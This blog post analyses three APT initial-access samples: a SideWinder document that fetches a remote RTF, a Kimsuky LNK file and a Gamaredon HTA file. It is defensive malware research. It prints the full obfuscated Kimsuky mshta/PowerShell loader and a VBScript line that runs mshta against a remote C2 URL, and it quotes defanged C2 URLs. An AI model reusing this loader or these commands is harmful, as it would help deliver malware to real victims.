---
layout: post
title: "Looking into Initial Access Payloads by APT Groups"
date: 2025-02-07
categories: ["Non-PE Malware"]
---

## Contents
- Introduction.
- Motivation.
- Technical Analysis
    - Case 1 : Sidewinder using malicious document to drop RTF Payload.
    - Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.
    - Case 3 : Gamaredon using HTA to drop further malware.
- YARA Rule.
    - Detecting Maldoc.
    - Detecting LNK.
    - Detecting HTA.
- IOCs.
- Limitations.
- MITRE ATT&CK.

## Introduction
![image](https://github.com/user-attachments/assets/b975d5f5-9074-4bd4-b747-efbaaa380ffd)

I recently started learning about maldoc analysis as part of my malware analysis journey. During this process, I explored different APT groups, including SideWinder( 🇮🇳 ), Kimsuky ( 🇰🇵 ) , and Gamaredon ( 🇷🇺 ). I analyzed their samples, focusing on how they gain initial access. To conduct my research, I used platforms like VirusTotal, Twitter, and MalwareBazaar to find and study real-world malware samples.So, I am writing this blog which contains my findings for the same.

## Motivation

My motivation is to explore different areas of malware analysis and gain a deeper understanding of how cyber threats operate. By researching various APT groups, I can learn about different initial access techniques used by attackers. This helps in understanding the diverse ways cybercriminals infiltrate systems. The more APT groups I analyze, the better I can recognize attack patterns and improve threat detection skills. My goal is to continuously expand my knowledge in Malware Analysis and Threat Research.

## Technical Analysis

I wanted to learn about different APT groups and how they execute attacks in the initial phase. So, I collected three malware samples of different APT groups from MalwareBazaar and studied their initial attack methods.

Each group uses a different approach:

- SideWinder delivers a malicious document (Maldoc).
- Kimsuky uses a LNK file.
- Gamaredon deploys an HTA file.

Now, I will analyze these files to understand their attack techniques.

### Case 1 : Sidewinder using malicious document to drop RTF Payload.

During my analysis of an initial phishing attempt, I came across a document file. To examine its internal structure, I used the oleid command, which helped identify that the file contained an external relationship. This indicated that the document might be referencing or attempting to fetch external content.

![image](https://github.com/user-attachments/assets/e758e58b-4572-4da6-9d70-94862601927d)


To dig deeper, I used the `oleobj` command, which revealed that the document was configured to **download an RTF file from an external source**. The URL of this external file was embedded within the document, and the file being fetched was named **profile.rtf**. This suggests that the document was likely being used to execute a second-stage payload, making it a potential **malicious downloader**.

`hxxps://pubad-gov-lk.org-co.net/10472857/Profile.rtf`

Then, after doing some research, I found that this is a **decoy RTF file**, while the actual **RTF payload** had already been removed from the **C2 server**.

For anyone interested in researching further on **how SideWinder targets victims or delivers the actual RTF payload**, you can refer to this [research](https://blog.strikeready.com/blog/rattling-the-cage-of-a-sidewinder/).

### Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.

In this case, I analyzed an **LNK file** and began by examining its **file structure**. During the analysis, I identified the following **flags**, which I will detail below.

LNK File Structure Analysis :

- **Flags Breakdown**:
    - `HasLinkTargetIDList`: Indicates that the LNK file contains a target ID list, pointing to a specific file or directory.
    - `HasLinkInfo`: Provides additional path information about the target file.
    - `HasArguments`: 
    When `HasArguments` is set, it means the LNK file has extra parameters (Command -line arguments) that will be executed when the shortcut is opened.
    - `EnableTargetMetadata`: Allows retrieving metadata for the target file.
      
- Target Execution Path:
  
  ![image_kimsuky](https://github.com/user-attachments/assets/88a27a9c-a177-4722-a1d2-186294f46347)

- **LinkTargetIDList →** `CLSID_MyComputer\C:\Windows\System32\mshta.exe`
- `mshta.exe` is a legitimate Windows utility, but attackers often misuse it to run **obfuscated JavaScript** for executing hidden **PowerShell commands**. This can download and execute malicious files. This technique falls under **LOLBins**, where trusted Windows utilities are exploited to bypass security detection.

Command-Line Arguments: Embedded JavaScript Execution

The **Command-Line Arguments** field in the LNK file contains **JavaScript code**, which will be executed along with **`mshta.exe`**. This means that when the LNK file is opened, `mshta.exe` will **run the JavaScript code**, potentially executing further malicious scripts.

Extracted JavaScript Code :

After extracting the JavaScript embedded in the LNK file, I obtained the following script:

```jsx
javascript:v=" -Encoding Byte;sc ";
s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";
c="powe"+"rshell -ep bypass -c $t=0x1be8;$k = Get-ChildItem .lnk | where-object {$*.length -eq $t} | Select-Object -ExpandProperty Name;
if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\\\*.lnk | where-object{$*.length -eq $t};};
$w='c:\\programdata\\d.ps1';
$f=gc $k"+v+"$w ([byte[]]($f | sel"+"ect -Skip 0x094a)) -Force"+v+"c:\\programdata\\b21111 0;
po"+"wersh"+"ell -ep bypass -f $w;";
eval(s);
```
This JavaScript code is trying to run a hidden **PowerShell command** using `mshta.exe`. It does this in several steps:

- The script creates a **WScript.Shell** object, which helps run commands on Windows.
- It then prepares a PowerShell command and executes it.
- The script looks for a **.lnk (shortcut) file** in the current folder.
- If it doesn't find the file, it searches in the **TEMP folder**.
- It checks if the file has a **specific size (7144 bytes)** to make sure it's the correct one.
- The script **reads the contents** of the .lnk file.
- It **skips the first part** of the file (2378 bytes) and extracts **some hidden data**.
- This data is saved as a new **PowerShell script** (`d.ps1`).
- The script **runs `d.ps1` using PowerShell**, which could be another piece of malware.
- It also calls another unknown program (`b21111`), which might be part of the attack.

Then, after researching the d.ps1 file, I found that it is obfuscated, which further on de-obfuscating, I found it has been downloading another ZIP file containing malware known as gs.zip , which contains the final payload.


### Case 3 : Gamaredon using HTA to drop further malware.

In this case, the file I found during the initial phishing analysis is an HTA file, which is a combination of HTML and VBScript.

![image_gam1](https://github.com/user-attachments/assets/76e4c57a-55e8-403b-8dff-c079730184f8)


When I analyzed this HTML file, I found multiple IP addresses and several **Domain Generation Algorithm (DGA)** domains associated with the **trycloudflare[.]com** website, as shown in the image below. **DGAs** are used by attackers to generate a large number of domain names dynamically, making it harder for security solutions to block them.

![image_gam2](https://github.com/user-attachments/assets/745bdd5d-de01-4c96-a969-39a54cf76a45)


Additionally, I discovered a **malicious script** embedded within the HTML file. Instead of being directly visible, the script was stored in a **string format** and was later reconstructed by concatenation. Once decoded, it was found to be executing another script, which could potentially download or execute additional payloads.

Now, let's analyze this script further to understand its purpose and behavior.

`CreateObject("WScript.Shell")[.]Run  "%windir%\system32\mshta[.]exe " &  "hxxps://louise-gzip-think-air.trycloudflare.com/OD/rotI7D/shortlyqXW.tif”`

This script basically accesses the **Windows Shell** and runs `mshta.exe`. The likely reason for using `mshta.exe` is to execute the script **without triggering any security warnings**.

Additionally, the script contains a **remote URL** that appears to download a file with a `.tif` extension. However, I suspect that this is actually a **malicious payload** being fetched from a **C2 server** rather than a legitimate image file.

